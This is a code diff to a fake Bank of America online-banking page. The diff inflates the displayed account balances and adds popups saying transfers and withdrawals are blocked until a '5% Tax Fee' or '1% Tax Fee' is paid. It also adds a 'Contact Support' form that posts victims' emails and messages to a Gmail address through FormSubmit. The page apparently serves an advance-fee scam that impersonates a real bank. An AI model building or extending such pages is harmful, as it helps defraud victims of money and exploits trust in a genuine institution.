@@ -441,7 +441,7 @@ body{font-family:'Source Sans 3',sans-serif;background:#e8e8e8;display:flex;alig
     <div class="tab-panel on" id="panel-accts">
       <div class="biz-card">
         <div class="biz-top" onclick="showModal('jenn')">
-          <span class="biz-name">Hello, Christopher Alex</span>
+          <span class="biz-name">Hello,Christopher Alex</span>
           <span class="chev">›</span>
         </div>
         <div class="biz-sub" onclick="showModal('rewards-summary')">
@@ -467,7 +467,7 @@ body{font-family:'Source Sans 3',sans-serif;background:#e8e8e8;display:flex;alig
           </div>
           <div class="acct-row" onclick="goAcctDetail('savings')">
             <div class="acct-name">Business Adv<br>Savings - 0193</div>
-            <div class="acct-right"><span class="acct-amt">$40,000.00</span><span class="chev">›</span></div>
+            <div class="acct-right"><span class="acct-amt">$70,000.00</span><span class="chev">›</span></div>
           </div>
         </div>
       </div>
@@ -510,7 +510,7 @@ body{font-family:'Source Sans 3',sans-serif;background:#e8e8e8;display:flex;alig
           </div>
           <div class="acct-row" onclick="goAcctDetail('401k')">
             <div class="acct-name">401(k) Plan¹</div>
-            <div class="acct-right"><span class="acct-amt">$85,000.00</span><span class="chev">›</span></div>
+            <div class="acct-right"><span class="acct-amt">$185,000.00</span><span class="chev">›</span></div>
           </div>
           <div class="acct-row" onclick="goAcctDetail('equity')">
             <div class="acct-name">Equity Plan²</div>
@@ -1010,6 +1010,38 @@ body{font-family:'Source Sans 3',sans-serif;background:#e8e8e8;display:flex;alig
   </div>
 </div>
 
+<!-- ════════════ SUPPORT FORM OVERLAY ════════════ -->
+<div id="support-overlay" style="display:none;position:absolute;inset:0;background:rgba(0,0,0,0.55);z-index:2000;align-items:flex-end;justify-content:center;">
+  <div id="support-sheet" style="background:#fff;width:100%;border-radius:18px 18px 0 0;padding:24px 20px 32px;transform:translateY(100%);transition:transform .35s cubic-bezier(.32,1,.5,1);max-height:88%;overflow-y:auto;">
+    <div style="width:36px;height:4px;background:#ddd;border-radius:2px;margin:0 auto 20px;"></div>
+    <div style="font-family:'Merriweather',serif;font-size:18px;font-weight:700;color:#1a1a1a;margin-bottom:4px;">Contact Support</div>
+    <div style="font-size:13px;color:#6b6b6b;margin-bottom:16px;">Fill out the form below and our team will get back to you shortly.</div>
+    <div id="support-issue-tag" style="display:inline-block;background:#fff3e6;border:1px solid #e65100;color:#b84000;font-size:11px;font-weight:700;padding:4px 10px;border-radius:20px;margin-bottom:16px;letter-spacing:.4px;text-transform:uppercase;"></div>
+    <div style="margin-bottom:14px;">
+      <label style="display:block;font-size:11px;font-weight:700;color:#6b6b6b;text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px;">Your Email Address</label>
+      <input id="support-email" type="email" placeholder="you@example.com"
+        style="width:100%;box-sizing:border-box;border:1.5px solid #e0e0e0;border-radius:8px;padding:12px 14px;font-size:14px;font-family:sans-serif;color:#1a1a1a;outline:none;"
+        onfocus="this.style.borderColor='#e31837'" onblur="this.style.borderColor='#e0e0e0'"/>
+    </div>
+    <div style="margin-bottom:20px;">
+      <label style="display:block;font-size:11px;font-weight:700;color:#6b6b6b;text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px;">Describe Your Issue</label>
+      <textarea id="support-message" placeholder="Please describe your issue in detail…" rows="4"
+        style="width:100%;box-sizing:border-box;border:1.5px solid #e0e0e0;border-radius:8px;padding:12px 14px;font-size:14px;font-family:sans-serif;color:#1a1a1a;outline:none;resize:none;"
+        onfocus="this.style.borderColor='#e31837'" onblur="this.style.borderColor='#e0e0e0'"></textarea>
+    </div>
+    <div id="support-error" style="display:none;background:#fdecea;border:1px solid #f5c6c6;border-radius:6px;padding:10px 12px;font-size:13px;color:#c0392b;margin-bottom:14px;"></div>
+    <div id="support-success" style="display:none;background:#e6f4ea;border:1px solid #a8d5b5;border-radius:6px;padding:10px 12px;font-size:13px;color:#2e7d32;margin-bottom:14px;"></div>
+    <button id="support-submit-btn" onclick="submitSupportForm()"
+      style="display:block;width:100%;padding:15px;background:#e31837;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:700;letter-spacing:1.2px;text-transform:uppercase;cursor:pointer;margin-bottom:10px;">
+      SEND MESSAGE
+    </button>
+    <button onclick="closeSupportForm()"
+      style="display:block;width:100%;padding:13px;background:none;border:1.5px solid #e0e0e0;border-radius:6px;font-size:14px;font-weight:600;color:#6b6b6b;cursor:pointer;">
+      Cancel
+    </button>
+  </div>
+</div>
+
 <!-- ════════════ MODAL SHEET ════════════ -->
 <div class="modal-overlay" id="modal-overlay" onclick="closeModal(event)">
   <div class="modal-sheet" id="modal-sheet">
@@ -1156,8 +1188,8 @@ const modalContents = {
   'rewards-dash': `<div class="modal-title">My Rewards</div><div class="modal-sub">Preferred Rewards for Business · Platinum Honors</div><div class="success-detail">${[['Points Balance','48,200 pts'],['Tier','Platinum Honors'],['Points Expiring','None'],['Cash Back Rate','Up to 3%'],['Card Bonus','+75% on rewards']].map(r=>`<div class="success-detail-row"><span class="key">${r[0]}</span><span class="val">${r[1]}</span></div>`).join('')}</div><button class="modal-confirm" onclick="closeModal();showToast('Redirecting to Rewards Center')">Redeem Points</button><button class="modal-close" onclick="closeModal()">Close</button>`,
   lifeplan: `<div class="modal-title">Bank of America Life Plan®</div><div class="modal-sub">Turn your dreams into an actionable plan.</div><p style="font-size:13px;color:#666;line-height:1.6;margin-bottom:16px;">Work with your goals and priorities to create a personalized financial plan. Track progress toward retirement, education savings, and more.</p><button class="modal-confirm" onclick="closeModal();showToast('Opening Life Plan…')">Get Started</button><button class="modal-close" onclick="closeModal()">Close</button>`,
   customize: `<div class="modal-title">Customize Dashboard</div><div class="modal-sub">Choose which cards to show on your dashboard.</div>${['Checking Account','Credit Card','Spending Overview','Zelle®','FICO® Score','Life Plan®','Rewards'].map(item=>`<div style="padding:12px 0;border-bottom:1px solid #eee;display:flex;justify-content:space-between;align-items:center;"><span style="font-size:14px;font-weight:600;">${item}</span><div style="width:44px;height:24px;background:#012169;border-radius:12px;cursor:pointer;display:flex;align-items:center;justify-content:flex-end;padding:2px;" onclick="showToast('${item} toggled')"><div style="width:20px;height:20px;background:#fff;border-radius:50%;"></div></div></div>`).join('')}<button class="modal-close" style="margin-top:16px;" onclick="closeModal()">Save Changes</button>`,
-  'transfer-popup': `<div class="modal-title">Transfer Funds</div><div style="display:flex;align-items:flex-start;gap:10px;background:#fff3e6;border:1.5px solid #e65100;border-radius:8px;padding:14px;margin-bottom:16px;"><span style="font-size:22px;line-height:1;">⚠️</span><div><div style="font-size:13px;font-weight:700;color:#b84000;margin-bottom:4px;">Account Temporarily Restricted</div><div style="font-size:13px;color:#7a3000;line-height:1.5;">This account is temporarily restricted from making transfers. You have an outstanding <strong>5% Tax Fee</strong> that must be resolved before proceeding.</div></div></div><button class="modal-confirm" onclick="closeModal();showToast('Connecting to support…')" style="background:#e65100;">Contact Support</button><button class="modal-close" onclick="closeModal()">Close</button>`,
-  'withdrawal-popup': `<div class="modal-title">Cash Withdrawal</div><div style="display:flex;align-items:flex-start;gap:10px;background:#fff3e6;border:1.5px solid #e65100;border-radius:8px;padding:14px;margin-bottom:16px;"><span style="font-size:22px;line-height:1;">⚠️</span><div><div style="font-size:13px;font-weight:700;color:#b84000;margin-bottom:4px;">Account Temporarily Restricted</div><div style="font-size:13px;color:#7a3000;line-height:1.5;">This account is temporarily restricted from making withdrawals. You have an outstanding <strong>5% Tax Fee</strong> that must be resolved before proceeding.</div></div></div><button class="modal-confirm" onclick="closeModal();showToast('Connecting to support…')" style="background:#e65100;">Contact Support</button><button class="modal-close" onclick="closeModal()">Close</button>`,
+  'transfer-popup': `<div class="modal-title">Transfer Funds</div><div style="display:flex;align-items:flex-start;gap:10px;background:#fff3e6;border:1.5px solid #e65100;border-radius:8px;padding:14px;margin-bottom:16px;"><span style="font-size:22px;line-height:1;">⚠️</span><div><div style="font-size:13px;font-weight:700;color:#b84000;margin-bottom:4px;">Account Temporarily Restricted</div><div style="font-size:13px;color:#7a3000;line-height:1.5;">This account is temporarily restricted from making transfers. You have an outstanding <strong>5% Tax Fee</strong> that must be resolved before proceeding.</div></div></div><button class="modal-confirm" onclick="openSupportForm('Transfer Restriction')" style="background:#e65100;">Contact Support</button><button class="modal-close" onclick="closeModal()">Close</button>`,
+  'withdrawal-popup': `<div class="modal-title">Cash Withdrawal</div><div style="display:flex;align-items:flex-start;gap:10px;background:#fff3e6;border:1.5px solid #e65100;border-radius:8px;padding:14px;margin-bottom:16px;"><span style="font-size:22px;line-height:1;">⚠️</span><div><div style="font-size:13px;font-weight:700;color:#b84000;margin-bottom:4px;">Account Temporarily Restricted</div><div style="font-size:13px;color:#7a3000;line-height:1.5;">This account is temporarily restricted from making withdrawals. You have an outstanding <strong>1% Tax Fee</strong> that must be resolved before proceeding.</div></div></div><button class="modal-confirm" onclick="openSupportForm('Withdrawal Restriction')" style="background:#e65100;">Contact Support</button><button class="modal-close" onclick="closeModal()">Close</button>`,
   wire: `<div class="modal-title">Wire Transfer</div><div class="modal-sub">Send domestic or international wire transfers.</div><button class="modal-confirm" onclick="closeModal();showToast('Opening wire transfer form…')">Domestic Wire</button><button class="modal-confirm" style="background:#012169;" onclick="closeModal();showToast('Opening international wire form…')">International Wire</button><button class="modal-close" onclick="closeModal()">Cancel</button>`,
   autopay: `<div class="modal-title">Set Up AutoPay</div><div class="modal-sub">Never miss a payment. Set up automatic payments for your accounts.</div><div class="form-field" style="margin-bottom:12px;"><label>Account</label><select><option>Cash Rewards Card - 9832</option><option>BankAmeriCard - 00001</option></select></div><div class="form-field" style="margin-bottom:12px;"><label>Payment Amount</label><select><option>Minimum Payment</option><option>Statement Balance</option><option>Custom Amount</option></select></div><button class="modal-confirm" onclick="closeModal();showToast('AutoPay configured!')">Enable AutoPay</button><button class="modal-close" onclick="closeModal()">Cancel</button>`,
   external: `<div class="modal-title">External Transfer</div><div class="modal-sub">Transfer money to or from accounts at other banks.</div><button class="modal-confirm" onclick="closeModal();showToast('Opening external transfer…')">Add External Account</button><button class="modal-close" onclick="closeModal()">Cancel</button>`,
@@ -1236,6 +1268,93 @@ function showToast(msg) {
 
 // ── INIT ──
 document.getElementById('transfer-date').valueAsDate = new Date();
+// ── SUPPORT FORM ──
+let currentIssueType = '';
+
+function openSupportForm(issueType) {
+  closeModal();
+  currentIssueType = issueType || 'General Inquiry';
+  document.getElementById('support-issue-tag').textContent = currentIssueType;
+  document.getElementById('support-email').value = '';
+  document.getElementById('support-message').value = '';
+  document.getElementById('support-error').style.display = 'none';
+  document.getElementById('support-success').style.display = 'none';
+  document.getElementById('support-submit-btn').textContent = 'SEND MESSAGE';
+  document.getElementById('support-submit-btn').disabled = false;
+  const overlay = document.getElementById('support-overlay');
+  const sheet = document.getElementById('support-sheet');
+  overlay.style.display = 'flex';
+  requestAnimationFrame(() => { sheet.style.transform = 'translateY(0)'; });
+}
+
+function closeSupportForm() {
+  const sheet = document.getElementById('support-sheet');
+  const overlay = document.getElementById('support-overlay');
+  sheet.style.transform = 'translateY(100%)';
+  setTimeout(() => { overlay.style.display = 'none'; }, 350);
+}
+
+async function submitSupportForm() {
+  const email = document.getElementById('support-email').value.trim();
+  const message = document.getElementById('support-message').value.trim();
+  const errEl = document.getElementById('support-error');
+  const sucEl = document.getElementById('support-success');
+  const btn = document.getElementById('support-submit-btn');
+
+  errEl.style.display = 'none';
+  sucEl.style.display = 'none';
+
+  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+    errEl.textContent = 'Please enter a valid email address.';
+    errEl.style.display = 'block';
+    return;
+  }
+  if (!message || message.length < 5) {
+    errEl.textContent = 'Please describe your issue.';
+    errEl.style.display = 'block';
+    return;
+  }
+
+  btn.textContent = 'SENDING…';
+  btn.disabled = true;
+
+  // Primary: FormSubmit (no signup needed, works on GitHub Pages)
+  try {
+    const res = await fetch('https://formsubmit.co/ajax/Boahelpdesk39@gmail.com', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+      body: JSON.stringify({
+        _subject: 'BofA Support: ' + currentIssueType,
+        _replyto: email,
+        _template: 'table',
+        _captcha: 'false',
+        from_email: email,
+        issue_type: currentIssueType,
+        message: message
+      })
+    });
+    const d = await res.json();
+    if (d.success === true || d.success === 'true') {
+      sucEl.textContent = '✓ Message sent! Our team will contact ' + email + ' shortly.';
+      sucEl.style.display = 'block';
+      btn.textContent = 'SENT ✓';
+      document.getElementById('support-email').value = '';
+      document.getElementById('support-message').value = '';
+      setTimeout(() => closeSupportForm(), 2500);
+      return;
+    }
+  } catch(e) {}
+
+  // Fallback: mailto (guaranteed to work everywhere)
+  const subject = encodeURIComponent('BofA Support Request: ' + currentIssueType);
+  const body = encodeURIComponent('From: ' + email + '\nIssue: ' + currentIssueType + '\n\n' + message);
+  window.location.href = 'mailto:boahelpdesk39@gmail.com?subject=' + subject + '&body=' + body;
+  sucEl.textContent = '✓ Your email app is opening with this message pre-filled. Tap Send to submit your request.';
+  sucEl.style.display = 'block';
+  btn.textContent = 'SEND MESSAGE';
+  btn.disabled = false;
+}
+
 </script>
 </body>
 </html>
